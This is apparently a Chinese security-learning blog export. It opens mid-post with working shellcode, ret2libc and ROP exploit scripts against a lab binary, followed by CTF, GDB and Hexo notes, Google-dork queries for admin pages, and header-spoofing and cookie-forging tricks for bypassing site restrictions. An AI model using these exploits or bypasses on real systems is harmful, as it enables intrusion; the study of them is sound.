机制了解了下面来一个实际的操作，初学练习就要把保护机制全部关闭。就用书上所用到的这个例子好了。 根据大神的指引，初学先把Linux下的保护机制全部关闭，指令如下：这个命令编译程序。-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector。下面的指令就是关闭Linux系统的ASpapLR保护 关闭之后就先开始对这个程序进行分析。先在python下创建150个测试数据gdb的插件peda自带pattern脚本直接生成 然后开始run进行调试 可以看出来错误地址是0x41416d41 然后使用指令可以计算PC返回值覆盖点为140个字节，所以只要构造一个“A”*140+ret字符串就可以让PC执行我们所需要的指令 之后就是需要一段shellcod，获取方法很多，网上找现成的，msf自动生成，作为初学者，shellcode不好找，因为gdb调试的时候会影响buf在内存的地址根据大神指示，有一个好的方法:开启core dump这个功能 ulimit -c unlimited sudo sh -c ‘echo “/tmp/core.%t” /proc/sys/kernel/core_pattern’ 开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。 因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xbffff029。 现在溢出点，shellcode和返回值地址都有。可以写exp了，最终测试代码如下: #!python #!/usr/bin/env python from pwn import * p = process(&apos;./test&apos;) ret = 0xbffff029 shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot; shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot; shellcode += &quot;\x0b\xcd\x80&quot; # p32(ret) == struct.pack(&quot;&lt;I&quot;,ret) #对ret进行编码，将地址转换成内存中的二进制存储形式 payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret) p.send(payload) #发送payload p.interactive() #开启交互shell 接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下： socat TCP4-LISTEN:10001,fork EXEC:./test 随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。 因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出啦！ 第二、Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护学习DEP就把DEP打开，其他两个（stack protector 和ASLR）依旧关闭开启DEP指令如下： gcc -fno-stack-protector -o test test.c 此时打开了DEP防护，那么如果还是提交上面那个脚本的话，系统会拒绝我们执行shellcode，现在的测试程序为rw，而上面确实rwx 我们知道test2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。 $ gdb ./test2 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04 …. (gdb) break main Breakpoint 1 at 0x8048430 (gdb) run Starting program: /home/mzheng/CTF/groupstudy/test/test2 Breakpoint 1, 0x08048430 in main () (gdb) print system $1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt; (gdb) print __libc_start_main $2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt; (gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdb如果安装有peda插件貌似这跳命令找不到) 0xb7f81ff8 warning: Unable to access target memory at 0xb7fc8500, halting search. 1 pattern found. (gdb) x/s 0xb7f81ff8 0xb7f81ff8: &quot;/bin/sh&quot; 我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp： #!python #!/usr/bin/env python from pwn import * p = process(&apos;./level2&apos;) #p = remote(&apos;127.0.0.1&apos;,10002) ret = 0xdeadbeef systemaddr=0xb7e5f460 binshaddr=0xb7f81ff8 payload = &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr) p.send(payload) p.interactive() 第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护下面打开ASLR保护，指令如下 sudo -s echo 2 /proc/sys/kernel/randomize_va_space 从现在开始会发现test的libc.so的地址每次都会变化。我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。首先我们利用objdump来查看可以利用的plt函数和函数对应的got表： 我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()[此函数用于确定动态库中函数地址]函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。使用ldd【 ldd命令用于判断某个可执行的 binary 档案含有什么动态函式库】命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址： 最后写exp： #!python #!/usr/bin/env python from pwn import * libc = ELF(&apos;libc.so&apos;) elf = ELF(&apos;test3&apos;) p = process(&apos;./test3&apos;) #p = remote(&apos;127.0.0.1&apos;, 10003) plt_write = elf.symbols[&apos;write&apos;] print &apos;plt_write= &apos; + hex(plt_write) got_write = elf.got[&apos;write&apos;] print &apos;got_write= &apos; + hex(got_write) vulfun_addr = 0x0804844d print &apos;vulfun= &apos; + hex(vulfun_addr) payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4) print &quot;\n###sending payload1 ...###&quot; p.send(payload1) print &quot;\n###receving write() addr...###&quot; write_addr = u32(p.recv(4)) print &apos;write_addr=&apos; + hex(write_addr) print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot; system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]) print &apos;system_addr= &apos; + hex(system_addr) binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;))) print &apos;binsh_addr= &apos; + hex(binsh_addr) payload2 = &apos;a&apos;*140 + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr) print &quot;\n###sending payload2 ...###&quot; p.send(payload2) p.interactive() 小结：本文主要根据大牛的文章一步一步进行操作和学习，当然一下子也很难全部接受，后面还要多加温习，熟能生巧。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice-1之图片reverse]]></title>
    <url>%2F2017%2F01%2F30%2Fpractice-1%E4%B9%8B%E5%9B%BE%E7%89%87reverse%2F</url>
    <content type="text"><![CDATA[嗯，找了好久在我能找的范围内都是算法大大相关的题目。 今儿无意发现reverse下有一道跟图片有关的题目，做了一下。了解了一个工具：C32Asm的用法以及隐藏flag的一种方法。就当开头长个见识了（至少我没见过！） 工具了解C32Asm: 静态反编译工具，C32Asm现具有如下功能：快速静态反编译PE格式文件(Exe、Dll等)，提供Hex文件编辑功能，功能强大，提供内存Dump、内存编辑、PE文件Dump、PE内存ImageSize修正等多种实用功能。 图片分析相关知识Exif： Exif是一种图像文件格式，储存个是与JPGE格式是完全相同的。Exif格式是在JPGE格式头部插入了数码照片的信息。（这个知识点里面还是可能隐藏flag的，以前遇到过）简单来说：Exif=JPGE+拍摄参数。 看题 一只可爱的小狗看看这个图片的信息。除了一些基本信息并没有隐藏着Exif的提示信息 OK，那么现在就用工具进行解析。下面就用C32Asm打开这个图片进行分析（其实Hex工具也可以）开头看到BM字符说明这个图片是BMP位图。 根据图片文字提示“奇怪的狗尾巴”（不用这个提示也习惯看完开头看结尾）。拉到结尾。发现IHDR 和 IEND这两个老搭配（当一个图片文件里有前者的时候必须找到后者这个图片才是合法的。加载两者中间的就是IDAT块儿，即图像数据信息。） 猜想：那么前面一定也有PNG标志。往前找，对的。下面要做的就是把这个PNG图片单独提取出来了 在该工具下再打开16进制文件保存又会得到一个二维码图片 扫描出现的是一个URL:http://blog.sina.com.cn/s/blog_703d65470102v6tf.html。 还是直接贴图片了。又是它， 不过提示换了。一个异或算法。 不知道异或个啥，全选数据，新知识，修改数据可以自动全部进行数据的异或。flag出来了]]></content>
      <categories>
        <category>reverse practice</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寒假计划]]></title>
    <url>%2F2017%2F01%2F16%2F%E5%AF%92%E5%81%87%E8%AE%A1%E5%88%92%2F</url>
    <content type="text"><![CDATA[寒假到了，一个关键的时间。定下一个学习计划来提升。 1、自主练习学习python参考书籍以及网上的知识自己进行python程序的练习，把网盘资料里的80个程序进行编辑练习。 2、逆向破解练习自己找10道对于算法无关的逆向题目进行破解，每题搞懂，将所得写到writeup上传博客。 3、一步一步学rop x86篇对于这篇文章自己进行学习，并写总结上传博客。 4、linux系统了解linux下的保护机制，一些常见漏洞的了解。]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GDB寄存器和内存查询指令]]></title>
    <url>%2F2016%2F11%2F12%2FGDB%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E5%86%85%E5%AD%98%E6%9F%A5%E8%AF%A2%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[今天下午学习pwn的基础知识，遇到了两个查询容易弄扯，在这儿总结下子。 1、查看寄存器 (gdb) i r(gdb) i r a # 查看所有寄存器（包括浮点、多媒体）(gdb) i r esp(gdb) i r pc 2、查看内存 (gdb) x /wx 0x80040000 # 以16进制显示指定地址处的数据(gdb) x /8x $esp(gdb) x /16x $esp+12(gdb) x /16s 0x86468700 # 以字符串形式显示指定地址处的数据(gdb) x /24i 0x8048a51 # 以指令形式显示指定地址处的数据（24条） 3、修改寄存器的值 (gdb) set $v0 = 0x004000000(gdb) set $epc = 0xbfc00000 4、修改内存的值 (gdb) set {unsigned int}0x8048a51=0x0(gdb) set (unsigned int)0x8048a54=0x55aa55aa 5、内存搜索 Usage: find (gdb) define findset $ptr = $arg0set $cnt = 0while ( ($ptr&lt;=$arg1) &amp;&amp; ($cnt&lt;$arg2) ) if ( (unsigned int )$ptr == $arg3 ) x /wx $ptr set $cnt = $cnt + 1 end set $ptr = $ptr + 4endend 6、断点、监测点 (gdb) b 0x80400000(gdb) watch (unsigned int *)0xbffff400==0x90909090]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>寄存器 debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb与peda指令学习学习笔记]]></title>
    <url>%2F2016%2F10%2F30%2Fgdb%E4%B8%8Epeda%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[下午学习的gdb指令。傻傻的对一个自己的程序输入打开指令打不开。问问才知道要先转换成可执行文件，上网有学学gcc指令收获不少啊。。 遇到问题1、写了一个C++语言但是用指令转换成可执行文件时候呢显示iostream不存在解决：对于C语言使用的转换指令是（假设文件是doc.c）将C语言的文件doc.c转换为了doc gcc doc.c -o doc 还有一个默认转换，也就是后面可以不加你转换的名字，系统默认转换后的名字为a.out gcc doc.c 对于C++语言使用的转换指令是 g++ doc.c -o doc 2、显示j=strlen(s)语句出错。解决：原来linux的习惯，strlen声明放在 string.h 中(linux系统中可以通过man strlen来查看其帮助和所在头文件)，仅仅 #include 只是引入了 std::string，还需要 #include ###3、其他指令(1)、 将test.c预处理输出test.i文件。 gcc -E test.c -o test.i (2)、 将预处理输出文件test.i汇编成test.s文件。 gcc -E test.c -o test.i (3)、 将汇编输出文件test.s编译输出test.o文件。 gcc -c test.s (4)、 将编译输出文件test.o链接成最终可执行文件test。 gcc test.o -o test (5)、 使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长。 gcc -O1 test.c -o test 4、多源文件的编译方法(1)、多个文件一起编译将testfun.c和test.c分别编译后链接成test可执行文件。 gcc testfun.c test.c -o test (2)、分别编译各个源文件，之后对编译后输出的目标文件链接。将testfun.c编译成testfun.o将test.c编译成test.o将testfun.o和test.o链接成test gcc -c testfun.cgcc -c test.cgcc -o testfun.o test.o -o test 在搜索的过程中也发现了一个好玩的命令就先记录下吧，这是个gdb下的指令。 如果想看看现在的默认反汇编格式是什么，可以使用如下命令 (gdb) show disassembly-flavor 如果看不懂，那就转换汇编格式 (gdb) set disassembly-flavor intel 经过以上的步骤就可以把想要的可执行文件得到，下面就是对程序进行指令分析。程序为(doc) 运行程序看看 ./doc 进入gdb指令下。（gdb + doc）反编译 disassemble main 下面是基础的调试指令 名称 介绍 用法 r r 是run的简写，也就是在GDB下运行程序。（如果有设置断点会运行到断点） （gdb）r c C是continue的简写，就是继执行被调试的程序，直到下一次断点处或者结束 （gdb）c b &lt;行号&gt;/&lt;函数名称&gt;/&lt;函数名称&gt;/&lt;代码地址&gt; b 是breakpoint的简写，就是设置断点，可以使用行号，函数名，执行地址进行下断。而函数名前加一个*则表示将断点设置在“由编译器生成的prolog代码处”，者在了解汇编后可以理解。 （gdb）b 8、（gdb）b main 、(gdb)b main 、（gdb）b 0x8048534 d [编号] d 是delete breakpoint的简写，就是删除制定编号后的断点，也可以一次删去所有断点。 （gdb）d 2 p &lt;变量名称&gt; P是print的简写，显示指定变量的值（临时变量或全局变量）。 （print）p n q 不需要多解释了，就是退出调试 （gdb）q S 执行一行源代码，如果此行代码有函数调用，进入该函数，也就相当于其他调试器的单步步入。 （gdb）s n 执行一段源代码，代码中的函数调用也一并执行，也就相当于其他调试器的单步步过。 （gdb）n Si ,ni 这两个对应着的是s和n。不同的是这两个是对汇编语言的，而前两个是对源代码的。 （gdb）si、（gdb）ni 然后是peda的一些指令 checksec –检查二进制的各种安全选项dumpargs –当在调用指令时停止显示参数传递给函数elfheader–调试文件的标题指令elfsymbol–从一个精灵文件获得非调试符号信息lookup –搜索所有的地址/参考地址属于一个内存范围readelf –从一个逆向文件获取标题信息patch –内存补丁开始在字符串/ hexstring /诠释一个地址（？）pattern –生成、搜索或写一个循环模式到内存pshow –显示各种PEDA选项和其他设置pset –设置各种peda选项和其他设置procinfo –显示从/ proc / PID的各种信息shellcode –生成或下载常见shellcodesxormem –一个密钥异或内存区vmmap –在调试过程中获得部分（S）的虚拟映射地址范围ropgadget–得到的二进制或静态库共同ROP小工具ropsearch –记忆中搜索rop小工具使用skeleton –Python开发代码生成模板dumprop –丢弃在特定的内存范围内所有ROP小工具searchmem|find –在记忆中搜索模式；支持正则表达式搜索 指令中提到了一个ROP，也不知道是啥，去搜一搜，原来：ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等） 这个溢出攻击可参照网址：http://www.programlife.net/linux-rop-stack-overflow.html]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo搭建]]></title>
    <url>%2F2016%2F09%2F04%2Fhexo%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[Hexo搭建Github静态博客 应用GitHub Pages创建属于自己的个人博客，GitHub将提供免费的空间。GitHub提供的域名（用户名+github+io）,在Repository name对应处填写资源名，其需要使用自己的用户名，每个用户名下面只能建立一个，并且资源命名必须符合这样的规则username/username.github.io，之后勾选下面的”Initialize this repository with a README” 1.环境1.1安装Git下载地址：https://git-scm.com/download/win下载安装包后正常安装即可。 1.2安装node.js下载地址：http://nodejs.org/download/可以下载 node-v0.10.33-x64.msi安装时直接保持默认配置即可。 2.配置Github1.1建立Repository建立与你用户名对应的仓库，仓库名必须为【your_user_name.github.io】 1.2配置SSH-Key参考：http://beiyuu.com/github-pages 3.安装Hexo关于Hexo的安装配置过程，请以官方Hexo给出的步骤为准。 3.1Installation打开Git命令行，执行如下命令 $ npm install -g hexo 3.2 Quick Start1.Setup your blog在电脑中建立一个名字叫「Hexo」的文件夹（比如我建在了D:\Hexo），然后在此文件夹中右键打开Git Bash。执行下面的命令 $ hexo init[info] Copying data[info] You are almost done! Don’t forget to run npm install before you start blogging with Hexo! Hexo随后会自动在目标文件夹建立网站所需要的文件。然后按照提示，运行 npm install（在 /D/Hexo下） npm install 会在D:\Hexo目录中安装 node_modules。 2.Start the server运行下面的命令（在 /D/Hexo下） $ hexo server[info] Hexo is running at http://localhost:4000/. Press Ctrl+C to stop. 3. Create a new post新打开一个git bash命令行窗口，cd到/D/Hexo下，执行下面的命令 $ hexo new “My New Post”[info] File created at d:\Hexo\source_posts\My-New-Post.md 刷新http://localhost:4000/，可以发现已生成了一篇新文章 “My New Post”。 NOTE:有一个问题，发现 “My New Post” 被发了2遍，在Hexo server所在的git bash窗口也能看到create了2次。 $ herxo serve[info] Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.[create] d:\Hexo\source_posts\My-New-Post.md[create] d:\Hexo\source_posts\My-New-Post.md 经验证，在hexo new “My New Post” 时，如果按Ctrl+C将hexo server停掉，就不会出现发2次的问题了。 所以，在hexo new文章时，需要stop server。 4. Generate static files执行下面的命令，将markdown文件生成静态网页 $ hexo generate 该命令执行完后，会在 D:\Hexo\public\ 目录下生成一系列html，css等文件。 5. 编辑文章 hexo new “My New Post”会在D:\Hexo\source_posts目录下生成一个markdown文件：My-New-Post.md可以使用一个支持markdown语法的编辑器（比如 Sublime Text 2）来编辑该文件。 6. 部署到Github 部署到Github前需要配置_config.yml文件，首先找到下面的内容 #Deployment ##Docs: http://hexo.io/docs/deployment.htmldeploy: type: 然后将它们修改为 #Deployment ##Docs: http://hexo.io/docs/deployment.htmldeploy: type: github repository: git@github.com:zhchnchn/zhchnchn.github.io.git branch: master NOTE1:Repository：必须是SSH形式的url（git@github.com:zhchnchn/zhchnchn.github.io.git），而不能是HTTPS形式的url（https://github.com/zhchnchn/zhchnchn.github.io.git），否则会出现错误： $ hexo deploy[info] Start deploying: github[error] https://github.com/zhchnchn/zhchnchn.github.io is not a valid repositor URL! 使用SSH url，如果电脑没有开放SSH 端口，会致部署失败。 fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. NOTE2：如果你是为一个项目制作网站，那么需要把branch设置为gh-pages。7. 测试当部署完成后，在浏览器中打开http://zhchnchn.github.io/（https://zhchnchn.github.io/） ，正常显示网页，表明部署成功。8. 总结：部署步骤每次部署的步骤，可按以下三步来进行。 hexo cleanhexo generatehexo deploy 9. 总结：本地调试 在执行下面的命令后， $ hexo g #生成$ hexo s #启动本地服务，进行文章预览调试 浏览器输入http://localhost:4000，查看搭建效果。此后的每次变更_config.yml 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。 2. 可以用简化的一条命令 hexo s -g 命令总结3.3.1常用命令 hexo new “postName” #新建文章hexo new page “pageName” #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）hexo deploy #将.deploy目录部署到GitHubhexo help # 查看帮助hexo version #查看Hexo的版本 3.3.2 hexo deploy -g #生成加部署hexo server -g #生成加预览 命令的简写为： hexo n == hexo newhexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy 4 配置Hexo4.1 配置文件介绍下面的各个部分的介绍，请直接参考【3】。 1._config.yml配置文件介绍NOTE：在修改_config.yml配置文件时，按照【3】的介绍进行修改后，重新 hexo clean 或者hexo deploy时，可能会出现如下错误： $ hexo clean[error] { name: ‘HexoError’, reason: ‘can not read a block mapping entry; a multiline key may not be an imp licit key’, mark: { name: null, buffer: ‘# Hexo Configuration\n## Docs: http://hexo.io/docs/configuration.h tml\n## Source: https://github.com/hexojs/hexo/\n\n# Site\ntitle: Zhchnchn\nsubt itle: Coding on the way\ndescription: Zhchnchn\’s blog\nauthor: Zhchnchn\nemail:115063497@qq.com\nlanguage:zh-CN\n\n# URL\n## If your site is put in a subdirect …… , position: 249, line: 12, column: 0 }, message: ‘Config file load failed’, domain: { domain: null, _events: { error: [Function] }, _maxListeners: 10, members: [ [Object] ] }, domainThrown: true, stack: undefined } 我的_config.yml配置文件是一个空行，所以错误肯定在前面，经过对比发现，我前面修改了一下 # Site的各项设置，在冒号:后面没留空格导致了该问题，请对比一下下面的区别： 错误的设置： author:Zhchnchnemail:XXX@qq.comlanguage:zh-CN 正确的设置： author: Zhchnchnemail: XXX@qq.comlanguage: zh-CN (问题在于必须要有空格) 4.2 安装主题Hexo提供了很多主题，具体可参见Hexo Themes【4】。这里我选择使用Pacman主题。具体设置方法如下【5】 4.2.1安装 将Git Shell 切到/D/Hexo目录下，然后执行下面的命令，将pacman下载到 themes/pacman 目录下。 $ git clone https://github.com/A-limon/pacman.git themes/pacman 修改你的博客根目录/D/Hexo下的config.yml配置文件中的theme属性，将其设置为pacman。 更新pacman主题 cd themes/pacmangit pull NOTE：先备份_config.yml 文件后再升级 4.4.2配置如果pacman的默认设置不能满足需要的话，你可以修改 /themes/pacman/下的配置文件_config.yml来定制。 详细主题跟新安装参照【http://blog.csdn.net/qq_23435721/article/details/50938038】 5.发布文章 $ hexo new “My New Post”[info] File created at d:\Hexo\source_posts\My-New-Post.mdhexo g #生成静态文件hexo g -d #部署到Github]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google hacking 语法]]></title>
    <url>%2F2016%2F09%2F03%2FGoogle-hacking-%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1.单词语法 intext:这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入：intext：动网，将返回所有在网页正文部分包含”动网”的网页。 allintext:使用方法和intext类似. intitle:和上面那个intext差不多，搜索网页标题中是否有我们所要找的字符，例如搜索：intitle：安全天使，将返回所有网页标题中包含“安全天使”的网页。同理allintitle也同intitle类似。 cache:搜索google里关于某些内容的缓存，有时候也许能找到一些好东西哦。 define:搜索某个词语的定义。搜索：define：hacker，将返回关于hacker的定义。 filetype:这个我要重点推荐一下，无论是撒网式攻击还是我们后面要说的搜索指定类型的文件。例如输入：filetype：doc，将返回所有以doc结尾的文件URL。当然如果你找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富。 info:查找指定站点的一些基本信息。 inurl:搜索我们指定的字符是否存在于URL中。例如输入：inurl：admin，将返回N个类似于这样的连接：http://www.xxx.com/xxx/admin。用来找管理员登陆的URL不错。allinurl也同inurl类似，可指定多个字符。 符号语法+ 把google可能忽略的字列如查询范围 -把某个字忽略 ~同意词 .单一的通配符 *通配符，可代表多个字母 “”精确查询]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>search</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过网站访问限制的方法]]></title>
    <url>%2F2016%2F09%2F03%2F%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1.只允许国外访问: 将 HTTP 请求头中的 Accept-Language 为中文(cn-zh)，修改为英文(en-us)。 2.浏览器限制访问:修改 HTTP 请求中的 User-Agent 信息。里面标注的有访问所用的浏览器和系统版本。也可以使用火狐的default user agent插件进行修改。 3.IP地址限制访问：跟 HTTP 请求头中的 X-Forwarded-For、client-ip、remote_addr 有关系，也可以使用代理进行访问。 4.用户登陆限制访问：可能是 Cookie 的问题，如果 Cookie 比较简单，可以尝试构造cookie。 5.隐藏信息：查看 robots.txt 可以获得该网站的一些信息。 6.其他：有一些加referer加上代理ip PS：原文:(http://byd.dropsec.xyz)]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>